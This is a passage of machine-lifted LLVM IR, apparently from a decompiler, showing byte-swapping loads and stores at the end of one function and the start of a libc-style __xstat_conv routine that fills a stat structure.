  %v3_1bedc = load i8, i8* %v2_1bedc, align 1
  %v4_1bedc = zext i8 %v3_1bedc to i32
  store i32 %v4_1bedc, i32* %r1.global-to-local, align 4
  %v1_1bee0 = add i32 %v0_1bed4, 32
  %v2_1bee0 = inttoptr i32 %v1_1bee0 to i8*
  %v3_1bee0 = load i8, i8* %v2_1bee0, align 1
  %v4_1bee0 = zext i8 %v3_1bee0 to i32
  %v1_1bee4 = add i32 %v0_1bed4, 38
  %v2_1bee4 = inttoptr i32 %v1_1bee4 to i8*
  %v3_1bee4 = load i8, i8* %v2_1bee4, align 1
  %v4_1bee4 = zext i8 %v3_1bee4 to i32
  %v1_1bee8 = add i32 %v0_1bed4, 34
  %v2_1bee8 = inttoptr i32 %v1_1bee8 to i8*
  %v3_1bee8 = load i8, i8* %v2_1bee8, align 1
  %v4_1bee8 = zext i8 %v3_1bee8 to i32
  %v3_1beec = mul nuw nsw i32 %v4_1bed4, 65536
  store i32 %v3_1beec, i32* %r3.global-to-local, align 4
  %v3_1bef0 = mul nuw nsw i32 %v4_1bed8, 65536
  %v1_1bef4 = add i32 %v0_1bed4, 39
  %v2_1bef4 = inttoptr i32 %v1_1bef4 to i8*
  %v3_1bef4 = load i8, i8* %v2_1bef4, align 1
  %v4_1bef4 = zext i8 %v3_1bef4 to i32
  store i32 %v4_1bef4, i32* %r0.global-to-local, align 4
  %v4_1bef8 = mul nuw i32 %v4_1bedc, 16777216
  %v5_1bef8 = or i32 %v4_1bef8, %v3_1beec
  store i32 %v5_1bef8, i32* %r3.global-to-local, align 4
  %v4_1befc = mul nuw i32 %v4_1bee0, 16777216
  %v5_1befc = or i32 %v4_1befc, %v3_1bef0
  %v1_1bf00 = add i32 %v0_1bed4, 35
  %v2_1bf00 = inttoptr i32 %v1_1bf00 to i8*
  %v3_1bf00 = load i8, i8* %v2_1bf00, align 1
  %v4_1bf00 = zext i8 %v3_1bf00 to i32
  %v4_1bf04 = mul nuw nsw i32 %v4_1bee4, 256
  %v5_1bf04 = or i32 %v4_1bf04, %v5_1bef8
  %v4_1bf08 = mul nuw nsw i32 %v4_1bee8, 256
  %v5_1bf08 = or i32 %v4_1bf08, %v5_1befc
  %v2_1bf0c = or i32 %v5_1bf04, %v4_1bef4
  store i32 %v2_1bf0c, i32* %r0.global-to-local, align 4
  %v2_1bf10 = or i32 %v5_1bf08, %v4_1bf00
  store i32 %v2_1bf10, i32* %r1.global-to-local, align 4
  store i32 %v2_1bf0c, i32* %r3.global-to-local, align 4
  %v1_1bf24 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bf24 = add i32 %v1_1bf24, 32
  %v3_1bf24 = inttoptr i32 %v2_1bf24 to i32*
  store i32 %v2_1bf10, i32* %v3_1bf24, align 4
  %v0_1bf28 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bf28 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bf28 = add i32 %v1_1bf28, 36
  %v3_1bf28 = inttoptr i32 %v2_1bf28 to i32*
  store i32 %v0_1bf28, i32* %v3_1bf28, align 4
  %v0_1bf2c = load i32, i32* %r4.global-to-local, align 4
  %v1_1bf2c = add i32 %v0_1bf2c, 49
  %v2_1bf2c = inttoptr i32 %v1_1bf2c to i8*
  %v3_1bf2c = load i8, i8* %v2_1bf2c, align 1
  %v4_1bf2c = zext i8 %v3_1bf2c to i32
  store i32 %v4_1bf2c, i32* %r3.global-to-local, align 4
  %v1_1bf30 = add i32 %v0_1bf2c, 45
  %v2_1bf30 = inttoptr i32 %v1_1bf30 to i8*
  %v3_1bf30 = load i8, i8* %v2_1bf30, align 1
  %v4_1bf30 = zext i8 %v3_1bf30 to i32
  %v1_1bf34 = add i32 %v0_1bf2c, 48
  %v2_1bf34 = inttoptr i32 %v1_1bf34 to i8*
  %v3_1bf34 = load i8, i8* %v2_1bf34, align 1
  %v4_1bf34 = zext i8 %v3_1bf34 to i32
  store i32 %v4_1bf34, i32* %r1.global-to-local, align 4
  %v1_1bf38 = add i32 %v0_1bf2c, 44
  %v2_1bf38 = inttoptr i32 %v1_1bf38 to i8*
  %v3_1bf38 = load i8, i8* %v2_1bf38, align 1
  %v4_1bf38 = zext i8 %v3_1bf38 to i32
  %v1_1bf3c = add i32 %v0_1bf2c, 50
  %v2_1bf3c = inttoptr i32 %v1_1bf3c to i8*
  %v3_1bf3c = load i8, i8* %v2_1bf3c, align 1
  %v4_1bf3c = zext i8 %v3_1bf3c to i32
  %v1_1bf40 = add i32 %v0_1bf2c, 46
  %v2_1bf40 = inttoptr i32 %v1_1bf40 to i8*
  %v3_1bf40 = load i8, i8* %v2_1bf40, align 1
  %v4_1bf40 = zext i8 %v3_1bf40 to i32
  %v3_1bf44 = mul nuw nsw i32 %v4_1bf2c, 65536
  store i32 %v3_1bf44, i32* %r3.global-to-local, align 4
  %v3_1bf48 = mul nuw nsw i32 %v4_1bf30, 65536
  %v1_1bf4c = add i32 %v0_1bf2c, 51
  %v2_1bf4c = inttoptr i32 %v1_1bf4c to i8*
  %v3_1bf4c = load i8, i8* %v2_1bf4c, align 1
  %v4_1bf4c = zext i8 %v3_1bf4c to i32
  store i32 %v4_1bf4c, i32* %r0.global-to-local, align 4
  %v4_1bf50 = mul nuw i32 %v4_1bf34, 16777216
  %v5_1bf50 = or i32 %v4_1bf50, %v3_1bf44
  store i32 %v5_1bf50, i32* %r3.global-to-local, align 4
  %v4_1bf54 = mul nuw i32 %v4_1bf38, 16777216
  %v5_1bf54 = or i32 %v4_1bf54, %v3_1bf48
  %v1_1bf58 = add i32 %v0_1bf2c, 47
  %v2_1bf58 = inttoptr i32 %v1_1bf58 to i8*
  %v3_1bf58 = load i8, i8* %v2_1bf58, align 1
  %v4_1bf58 = zext i8 %v3_1bf58 to i32
  %v4_1bf5c = mul nuw nsw i32 %v4_1bf3c, 256
  %v5_1bf5c = or i32 %v4_1bf5c, %v5_1bf50
  store i32 %v5_1bf5c, i32* %r3.global-to-local, align 4
  %v4_1bf60 = mul nuw nsw i32 %v4_1bf40, 256
  %v5_1bf60 = or i32 %v4_1bf60, %v5_1bf54
  %v2_1bf64 = or i32 %v4_1bf4c, %v5_1bf5c
  store i32 %v2_1bf64, i32* %r0.global-to-local, align 4
  %v2_1bf68 = or i32 %v4_1bf58, %v5_1bf60
  store i32 %v2_1bf68, i32* %r1.global-to-local, align 4
  %v1_1bf74 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bf74 = add i32 %v1_1bf74, 44
  %v3_1bf74 = inttoptr i32 %v2_1bf74 to i32*
  store i32 %v2_1bf64, i32* %v3_1bf74, align 4
  %v0_1bf78 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bf78 = add i32 %v0_1bf78, 53
  %v2_1bf78 = inttoptr i32 %v1_1bf78 to i8*
  %v3_1bf78 = load i8, i8* %v2_1bf78, align 1
  %v4_1bf78 = zext i8 %v3_1bf78 to i32
  store i32 %v4_1bf78, i32* %r3.global-to-local, align 4
  %v1_1bf7c = add i32 %v0_1bf78, 52
  %v2_1bf7c = inttoptr i32 %v1_1bf7c to i8*
  %v3_1bf7c = load i8, i8* %v2_1bf7c, align 1
  %v4_1bf7c = zext i8 %v3_1bf7c to i32
  %v1_1bf80 = add i32 %v0_1bf78, 54
  %v2_1bf80 = inttoptr i32 %v1_1bf80 to i8*
  %v3_1bf80 = load i8, i8* %v2_1bf80, align 1
  %v4_1bf80 = zext i8 %v3_1bf80 to i32
  store i32 %v4_1bf80, i32* %r1.global-to-local, align 4
  %v3_1bf84 = mul nuw nsw i32 %v4_1bf78, 65536
  %v4_1bf88 = mul nuw i32 %v4_1bf7c, 16777216
  %v5_1bf88 = or i32 %v4_1bf88, %v3_1bf84
  store i32 %v5_1bf88, i32* %r3.global-to-local, align 4
  %v1_1bf8c = add i32 %v0_1bf78, 55
  %v2_1bf8c = inttoptr i32 %v1_1bf8c to i8*
  %v3_1bf8c = load i8, i8* %v2_1bf8c, align 1
  %v4_1bf8c = zext i8 %v3_1bf8c to i32
  %v4_1bf90 = mul nuw nsw i32 %v4_1bf80, 256
  %v5_1bf90 = or i32 %v4_1bf90, %v5_1bf88
  store i32 %v5_1bf90, i32* %r3.global-to-local, align 4
  %v2_1bf94 = or i32 %v4_1bf8c, %v5_1bf90
  %v1_1bf98 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bf98 = add i32 %v1_1bf98, 48
  %v3_1bf98 = inttoptr i32 %v2_1bf98 to i32*
  store i32 %v2_1bf94, i32* %v3_1bf98, align 4
  %v0_1bf9c = load i32, i32* %r4.global-to-local, align 4
  %v1_1bf9c = add i32 %v0_1bf9c, 61
  %v2_1bf9c = inttoptr i32 %v1_1bf9c to i8*
  %v3_1bf9c = load i8, i8* %v2_1bf9c, align 1
  %v4_1bf9c = zext i8 %v3_1bf9c to i32
  store i32 %v4_1bf9c, i32* %r3.global-to-local, align 4
  %v1_1bfa0 = add i32 %v0_1bf9c, 57
  %v2_1bfa0 = inttoptr i32 %v1_1bfa0 to i8*
  %v3_1bfa0 = load i8, i8* %v2_1bfa0, align 1
  %v4_1bfa0 = zext i8 %v3_1bfa0 to i32
  %v1_1bfa4 = add i32 %v0_1bf9c, 60
  %v2_1bfa4 = inttoptr i32 %v1_1bfa4 to i8*
  %v3_1bfa4 = load i8, i8* %v2_1bfa4, align 1
  %v4_1bfa4 = zext i8 %v3_1bfa4 to i32
  store i32 %v4_1bfa4, i32* %r1.global-to-local, align 4
  %v1_1bfa8 = add i32 %v0_1bf9c, 56
  %v2_1bfa8 = inttoptr i32 %v1_1bfa8 to i8*
  %v3_1bfa8 = load i8, i8* %v2_1bfa8, align 1
  %v4_1bfa8 = zext i8 %v3_1bfa8 to i32
  %v1_1bfac = add i32 %v0_1bf9c, 62
  %v2_1bfac = inttoptr i32 %v1_1bfac to i8*
  %v3_1bfac = load i8, i8* %v2_1bfac, align 1
  %v4_1bfac = zext i8 %v3_1bfac to i32
  %v1_1bfb0 = add i32 %v0_1bf9c, 58
  %v2_1bfb0 = inttoptr i32 %v1_1bfb0 to i8*
  %v3_1bfb0 = load i8, i8* %v2_1bfb0, align 1
  %v4_1bfb0 = zext i8 %v3_1bfb0 to i32
  %v3_1bfb4 = mul nuw nsw i32 %v4_1bf9c, 65536
  %v3_1bfb8 = mul nuw nsw i32 %v4_1bfa0, 65536
  %v4_1bfbc = mul nuw i32 %v4_1bfa4, 16777216
  %v5_1bfbc = or i32 %v4_1bfbc, %v3_1bfb4
  store i32 %v5_1bfbc, i32* %r3.global-to-local, align 4
  %v1_1bfc0 = add i32 %v0_1bf9c, 63
  %v2_1bfc0 = inttoptr i32 %v1_1bfc0 to i8*
  %v3_1bfc0 = load i8, i8* %v2_1bfc0, align 1
  %v4_1bfc0 = zext i8 %v3_1bfc0 to i32
  store i32 %v4_1bfc0, i32* %r0.global-to-local, align 4
  %v1_1bfc4 = add i32 %v0_1bf9c, 59
  %v2_1bfc4 = inttoptr i32 %v1_1bfc4 to i8*
  %v3_1bfc4 = load i8, i8* %v2_1bfc4, align 1
  %v4_1bfc4 = zext i8 %v3_1bfc4 to i32
  %v4_1bfc8 = mul nuw i32 %v4_1bfa8, 16777216
  %v5_1bfc8 = or i32 %v4_1bfc8, %v3_1bfb8
  %v4_1bfcc = mul nuw nsw i32 %v4_1bfac, 256
  %v5_1bfcc = or i32 %v4_1bfcc, %v5_1bfbc
  store i32 %v5_1bfcc, i32* %r3.global-to-local, align 4
  %v4_1bfd0 = mul nuw nsw i32 %v4_1bfb0, 256
  %v5_1bfd0 = or i32 %v5_1bfc8, %v4_1bfd0
  %v2_1bfd4 = or i32 %v4_1bfc0, %v5_1bfcc
  store i32 %v2_1bfd4, i32* %r0.global-to-local, align 4
  %v2_1bfd8 = or i32 %v4_1bfc4, %v5_1bfd0
  store i32 %v2_1bfd8, i32* %r1.global-to-local, align 4
  %v1_1bfe4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1bfe4 = add i32 %v1_1bfe4, 52
  %v3_1bfe4 = inttoptr i32 %v2_1bfe4 to i32*
  store i32 %v2_1bfd4, i32* %v3_1bfe4, align 4
  %v0_1bfe8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1bfe8 = add i32 %v0_1bfe8, 65
  %v2_1bfe8 = inttoptr i32 %v1_1bfe8 to i8*
  %v3_1bfe8 = load i8, i8* %v2_1bfe8, align 1
  %v4_1bfe8 = zext i8 %v3_1bfe8 to i32
  store i32 %v4_1bfe8, i32* %r3.global-to-local, align 4
  %v1_1bfec = add i32 %v0_1bfe8, 69
  %v2_1bfec = inttoptr i32 %v1_1bfec to i8*
  %v3_1bfec = load i8, i8* %v2_1bfec, align 1
  %v4_1bfec = zext i8 %v3_1bfec to i32
  %v1_1bff0 = add i32 %v0_1bfe8, 64
  %v2_1bff0 = inttoptr i32 %v1_1bff0 to i8*
  %v3_1bff0 = load i8, i8* %v2_1bff0, align 1
  %v4_1bff0 = zext i8 %v3_1bff0 to i32
  store i32 %v4_1bff0, i32* %r1.global-to-local, align 4
  %v1_1bff4 = add i32 %v0_1bfe8, 68
  %v2_1bff4 = inttoptr i32 %v1_1bff4 to i8*
  %v3_1bff4 = load i8, i8* %v2_1bff4, align 1
  %v4_1bff4 = zext i8 %v3_1bff4 to i32
  store i32 %v4_1bff4, i32* %r0.global-to-local, align 4
  %v1_1bff8 = add i32 %v0_1bfe8, 66
  %v2_1bff8 = inttoptr i32 %v1_1bff8 to i8*
  %v3_1bff8 = load i8, i8* %v2_1bff8, align 1
  %v4_1bff8 = zext i8 %v3_1bff8 to i32
  %v1_1bffc = add i32 %v0_1bfe8, 70
  %v2_1bffc = inttoptr i32 %v1_1bffc to i8*
  %v3_1bffc = load i8, i8* %v2_1bffc, align 1
  %v4_1bffc = zext i8 %v3_1bffc to i32
  %v3_1c000 = mul nuw nsw i32 %v4_1bfe8, 65536
  %v3_1c004 = mul nuw nsw i32 %v4_1bfec, 65536
  %v4_1c008 = mul nuw i32 %v4_1bff0, 16777216
  %v5_1c008 = or i32 %v4_1c008, %v3_1c000
  store i32 %v5_1c008, i32* %r3.global-to-local, align 4
  %v4_1c00c = mul nuw i32 %v4_1bff4, 16777216
  %v5_1c00c = or i32 %v4_1c00c, %v3_1c004
  %v1_1c010 = add i32 %v0_1bfe8, 71
  %v2_1c010 = inttoptr i32 %v1_1c010 to i8*
  %v3_1c010 = load i8, i8* %v2_1c010, align 1
  %v4_1c010 = zext i8 %v3_1c010 to i32
  store i32 %v4_1c010, i32* %r1.global-to-local, align 4
  %v1_1c014 = add i32 %v0_1bfe8, 67
  %v2_1c014 = inttoptr i32 %v1_1c014 to i8*
  %v3_1c014 = load i8, i8* %v2_1c014, align 1
  %v4_1c014 = zext i8 %v3_1c014 to i32
  %v4_1c018 = mul nuw nsw i32 %v4_1bff8, 256
  %v5_1c018 = or i32 %v4_1c018, %v5_1c008
  store i32 %v5_1c018, i32* %r3.global-to-local, align 4
  %v4_1c01c = mul nuw nsw i32 %v4_1bffc, 256
  %v5_1c01c = or i32 %v4_1c01c, %v5_1c00c
  %v2_1c020 = or i32 %v4_1c014, %v5_1c018
  store i32 %v2_1c020, i32* %r0.global-to-local, align 4
  %v2_1c024 = or i32 %v4_1c010, %v5_1c01c
  store i32 %v2_1c024, i32* %r1.global-to-local, align 4
  %v1_1c028 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c028 = add i32 %v1_1c028, 60
  %v3_1c028 = inttoptr i32 %v2_1c028 to i32*
  store i32 %v2_1c024, i32* %v3_1c028, align 4
  %v0_1c02c = load i32, i32* %r0.global-to-local, align 4
  %v1_1c02c = load i32, i32* %r8.global-to-local, align 4
  %v2_1c02c = add i32 %v1_1c02c, 56
  %v3_1c02c = inttoptr i32 %v2_1c02c to i32*
  store i32 %v0_1c02c, i32* %v3_1c02c, align 4
  %v0_1c030 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c030 = add i32 %v0_1c030, 73
  %v2_1c030 = inttoptr i32 %v1_1c030 to i8*
  %v3_1c030 = load i8, i8* %v2_1c030, align 1
  %v4_1c030 = zext i8 %v3_1c030 to i32
  store i32 %v4_1c030, i32* %r3.global-to-local, align 4
  %v1_1c034 = add i32 %v0_1c030, 77
  %v2_1c034 = inttoptr i32 %v1_1c034 to i8*
  %v3_1c034 = load i8, i8* %v2_1c034, align 1
  %v4_1c034 = zext i8 %v3_1c034 to i32
  %v1_1c038 = add i32 %v0_1c030, 72
  %v2_1c038 = inttoptr i32 %v1_1c038 to i8*
  %v3_1c038 = load i8, i8* %v2_1c038, align 1
  %v4_1c038 = zext i8 %v3_1c038 to i32
  store i32 %v4_1c038, i32* %r1.global-to-local, align 4
  %v1_1c03c = add i32 %v0_1c030, 76
  %v2_1c03c = inttoptr i32 %v1_1c03c to i8*
  %v3_1c03c = load i8, i8* %v2_1c03c, align 1
  %v4_1c03c = zext i8 %v3_1c03c to i32
  store i32 %v4_1c03c, i32* %r0.global-to-local, align 4
  %v1_1c040 = add i32 %v0_1c030, 74
  %v2_1c040 = inttoptr i32 %v1_1c040 to i8*
  %v3_1c040 = load i8, i8* %v2_1c040, align 1
  %v4_1c040 = zext i8 %v3_1c040 to i32
  %v1_1c044 = add i32 %v0_1c030, 78
  %v2_1c044 = inttoptr i32 %v1_1c044 to i8*
  %v3_1c044 = load i8, i8* %v2_1c044, align 1
  %v4_1c044 = zext i8 %v3_1c044 to i32
  %v3_1c048 = mul nuw nsw i32 %v4_1c030, 65536
  %v3_1c04c = mul nuw nsw i32 %v4_1c034, 65536
  %v4_1c050 = mul nuw i32 %v4_1c038, 16777216
  %v5_1c050 = or i32 %v4_1c050, %v3_1c048
  store i32 %v5_1c050, i32* %r3.global-to-local, align 4
  %v4_1c054 = mul nuw i32 %v4_1c03c, 16777216
  %v5_1c054 = or i32 %v4_1c054, %v3_1c04c
  %v1_1c058 = add i32 %v0_1c030, 79
  %v2_1c058 = inttoptr i32 %v1_1c058 to i8*
  %v3_1c058 = load i8, i8* %v2_1c058, align 1
  %v4_1c058 = zext i8 %v3_1c058 to i32
  store i32 %v4_1c058, i32* %r1.global-to-local, align 4
  %v1_1c05c = add i32 %v0_1c030, 75
  %v2_1c05c = inttoptr i32 %v1_1c05c to i8*
  %v3_1c05c = load i8, i8* %v2_1c05c, align 1
  %v4_1c05c = zext i8 %v3_1c05c to i32
  %v4_1c060 = mul nuw nsw i32 %v4_1c040, 256
  %v5_1c060 = or i32 %v4_1c060, %v5_1c050
  store i32 %v5_1c060, i32* %r3.global-to-local, align 4
  %v4_1c064 = mul nuw nsw i32 %v4_1c044, 256
  %v5_1c064 = or i32 %v4_1c064, %v5_1c054
  %v2_1c068 = or i32 %v4_1c05c, %v5_1c060
  store i32 %v2_1c068, i32* %r0.global-to-local, align 4
  %v2_1c06c = or i32 %v4_1c058, %v5_1c064
  store i32 %v2_1c06c, i32* %r1.global-to-local, align 4
  %v1_1c070 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c070 = add i32 %v1_1c070, 68
  %v3_1c070 = inttoptr i32 %v2_1c070 to i32*
  store i32 %v2_1c06c, i32* %v3_1c070, align 4
  %v0_1c074 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c074 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c074 = add i32 %v1_1c074, 64
  %v3_1c074 = inttoptr i32 %v2_1c074 to i32*
  store i32 %v0_1c074, i32* %v3_1c074, align 4
  %v0_1c078 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c078 = add i32 %v0_1c078, 81
  %v2_1c078 = inttoptr i32 %v1_1c078 to i8*
  %v3_1c078 = load i8, i8* %v2_1c078, align 1
  %v4_1c078 = zext i8 %v3_1c078 to i32
  store i32 %v4_1c078, i32* %r3.global-to-local, align 4
  %v1_1c07c = add i32 %v0_1c078, 85
  %v2_1c07c = inttoptr i32 %v1_1c07c to i8*
  %v3_1c07c = load i8, i8* %v2_1c07c, align 1
  %v4_1c07c = zext i8 %v3_1c07c to i32
  %v1_1c080 = add i32 %v0_1c078, 80
  %v2_1c080 = inttoptr i32 %v1_1c080 to i8*
  %v3_1c080 = load i8, i8* %v2_1c080, align 1
  %v4_1c080 = zext i8 %v3_1c080 to i32
  store i32 %v4_1c080, i32* %r1.global-to-local, align 4
  %v1_1c084 = add i32 %v0_1c078, 84
  %v2_1c084 = inttoptr i32 %v1_1c084 to i8*
  %v3_1c084 = load i8, i8* %v2_1c084, align 1
  %v4_1c084 = zext i8 %v3_1c084 to i32
  store i32 %v4_1c084, i32* %r0.global-to-local, align 4
  %v1_1c088 = add i32 %v0_1c078, 82
  %v2_1c088 = inttoptr i32 %v1_1c088 to i8*
  %v3_1c088 = load i8, i8* %v2_1c088, align 1
  %v4_1c088 = zext i8 %v3_1c088 to i32
  %v1_1c08c = add i32 %v0_1c078, 86
  %v2_1c08c = inttoptr i32 %v1_1c08c to i8*
  %v3_1c08c = load i8, i8* %v2_1c08c, align 1
  %v4_1c08c = zext i8 %v3_1c08c to i32
  %v3_1c090 = mul nuw nsw i32 %v4_1c078, 65536
  %v3_1c094 = mul nuw nsw i32 %v4_1c07c, 65536
  %v4_1c098 = mul nuw i32 %v4_1c080, 16777216
  %v5_1c098 = or i32 %v4_1c098, %v3_1c090
  store i32 %v5_1c098, i32* %r3.global-to-local, align 4
  %v4_1c09c = mul nuw i32 %v4_1c084, 16777216
  %v5_1c09c = or i32 %v4_1c09c, %v3_1c094
  %v1_1c0a0 = add i32 %v0_1c078, 83
  %v2_1c0a0 = inttoptr i32 %v1_1c0a0 to i8*
  %v3_1c0a0 = load i8, i8* %v2_1c0a0, align 1
  %v4_1c0a0 = zext i8 %v3_1c0a0 to i32
  store i32 %v4_1c0a0, i32* %r1.global-to-local, align 4
  %v1_1c0a4 = add i32 %v0_1c078, 87
  %v2_1c0a4 = inttoptr i32 %v1_1c0a4 to i8*
  %v3_1c0a4 = load i8, i8* %v2_1c0a4, align 1
  %v4_1c0a4 = zext i8 %v3_1c0a4 to i32
  %v4_1c0a8 = mul nuw nsw i32 %v4_1c088, 256
  %v5_1c0a8 = or i32 %v4_1c0a8, %v5_1c098
  store i32 %v5_1c0a8, i32* %r3.global-to-local, align 4
  %v4_1c0ac = mul nuw nsw i32 %v4_1c08c, 256
  %v5_1c0ac = or i32 %v4_1c0ac, %v5_1c09c
  %v2_1c0b0 = or i32 %v4_1c0a0, %v5_1c0a8
  store i32 %v2_1c0b0, i32* %r1.global-to-local, align 4
  %v2_1c0b4 = or i32 %v4_1c0a4, %v5_1c0ac
  store i32 %v2_1c0b4, i32* %r0.global-to-local, align 4
  %v1_1c0b8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c0b8 = add i32 %v1_1c0b8, 72
  %v3_1c0b8 = inttoptr i32 %v2_1c0b8 to i32*
  store i32 %v2_1c0b0, i32* %v3_1c0b8, align 4
  %v1_1c0bc = load i32, i32* %r8.global-to-local, align 4
  %v2_1c0bc = add i32 %v1_1c0bc, 76
  %v3_1c0bc = inttoptr i32 %v2_1c0bc to i32*
  store i32 %v2_1c0b4, i32* %v3_1c0bc, align 4
  ret i32 %v2_1c0b4

; uselistorder directives
  uselistorder i32 %v0_1c078, { 1, 0, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_1c030, { 1, 0, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_1bfe8, { 1, 0, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_1bf9c, { 1, 0, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v3_1bf44, { 1, 0 }
  uselistorder i32 %v0_1bf2c, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v3_1beec, { 1, 0 }
  uselistorder i32 %v0_1bed4, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v3_1be28, { 1, 0 }
  uselistorder i32 %v3_1bdf0, { 1, 0 }
  uselistorder i32 %v0_1bdd8, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 0 }
  uselistorder i32 87, { 1, 2, 0, 4, 3 }
  uselistorder i32 84, { 1, 2, 3, 0, 4 }
  uselistorder i32 80, { 1, 2, 3, 0, 5, 6, 7, 8, 4 }
  uselistorder i32 81, { 1, 2, 0, 4, 3 }
  uselistorder i32 69, { 1, 2, 0, 3 }
  uselistorder i32 65, { 2, 3, 1, 4, 5, 0 }
  uselistorder i32 62, { 1, 2, 0, 3 }
  uselistorder i32 57, { 0, 1, 3, 2 }
  uselistorder i32 55, { 0, 1, 3, 2 }
  uselistorder i32 53, { 1, 2, 0, 3 }
  uselistorder i32 47, { 1, 2, 0, 3 }
  uselistorder i32 50, { 1, 2, 0, 3 }
  uselistorder i32 45, { 1, 2, 3, 0 }
  uselistorder i32 49, { 2, 3, 0, 1, 4 }
  uselistorder i32 39, { 0, 1, 3, 2 }
  uselistorder i32 37, { 1, 2, 4, 0, 3 }
  uselistorder i32 30, { 5, 6, 0, 8, 1, 2, 7, 3, 4 }
  uselistorder i32 26, { 2, 3, 0, 4, 1 }
  uselistorder i32 21, { 1, 2, 0, 4, 3 }
  uselistorder i32 95, { 2, 3, 1, 0, 4 }
  uselistorder i32 92, { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @__xstat_conv(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1c0c8 = load i32, i32* @r4, align 4
  store i32 %v3_1c0c8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_1c0e0 = inttoptr i32 %arg2 to i8*
  %v3_1c0e0 = call i32 @__GI_memset(i8* %v2_1c0e0, i32 0)
  store i32 %v3_1c0e0, i32* %r0.global-to-local, align 4
  %v0_1c0e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c0e4 = inttoptr i32 %v0_1c0e4 to i8*
  %v2_1c0e4 = load i8, i8* %v1_1c0e4, align 1
  %v3_1c0e4 = zext i8 %v2_1c0e4 to i32
  store i32 %v3_1c0e4, i32* %r2.global-to-local, align 4
  %v1_1c0e8 = add i32 %v0_1c0e4, 1
  %v2_1c0e8 = inttoptr i32 %v1_1c0e8 to i8*
  %v3_1c0e8 = load i8, i8* %v2_1c0e8, align 1
  %v4_1c0e8 = zext i8 %v3_1c0e8 to i32
  %v4_1c0ec = mul nuw nsw i32 %v3_1c0e4, 256
  %v5_1c0ec = or i32 %v4_1c0e8, %v4_1c0ec
  store i32 %v5_1c0ec, i32* %r3.global-to-local, align 4
  %v1_1c0f0 = add i32 %v0_1c0e4, 4
  %v2_1c0f0 = inttoptr i32 %v1_1c0f0 to i32*
  %v3_1c0f0 = load i32, i32* %v2_1c0f0, align 4
  store i32 %v3_1c0f0, i32* %r0.global-to-local, align 4
  store i32 %v5_1c0ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1c0fc = load i32, i32* %r6.global-to-local, align 4
  %v2_1c0fc = add i32 %v1_1c0fc, 4
  %v3_1c0fc = inttoptr i32 %v2_1c0fc to i32*
  store i32 %v5_1c0ec, i32* %v3_1c0fc, align 4
  %v0_1c100 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c100 = inttoptr i32 %v0_1c100 to i32*
  %v2_1c100 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_1c100, i32* %v1_1c100, align 4
  %v3_1c100 = add i32 %v0_1c100, 4
  %v4_1c100 = inttoptr i32 %v3_1c100 to i32*
  %v5_1c100 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1c100, i32* %v4_1c100, align 4
  %v0_1c104 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c104 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c104 = add i32 %v1_1c104, 12
  %v3_1c104 = inttoptr i32 %v2_1c104 to i32*
  store i32 %v0_1c104, i32* %v3_1c104, align 4
  %v0_1c108 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c108 = add i32 %v0_1c108, 8
  %v2_1c108 = inttoptr i32 %v1_1c108 to i8*
  %v3_1c108 = load i8, i8* %v2_1c108, align 1
  %v4_1c108 = zext i8 %v3_1c108 to i32
  store i32 %v4_1c108, i32* %r2.global-to-local, align 4
  %v1_1c10c = add i32 %v0_1c108, 9
  %v2_1c10c = inttoptr i32 %v1_1c10c to i8*
  %v3_1c10c = load i8, i8* %v2_1c10c, align 1
  %v4_1c10c = zext i8 %v3_1c10c to i32
  %v4_1c110 = mul nuw nsw i32 %v4_1c108, 256
  %v5_1c110 = or i32 %v4_1c10c, %v4_1c110
  store i32 %v5_1c110, i32* %r3.global-to-local, align 4
  %v1_1c114 = load i32, i32* %r6.global-to-local, align 4
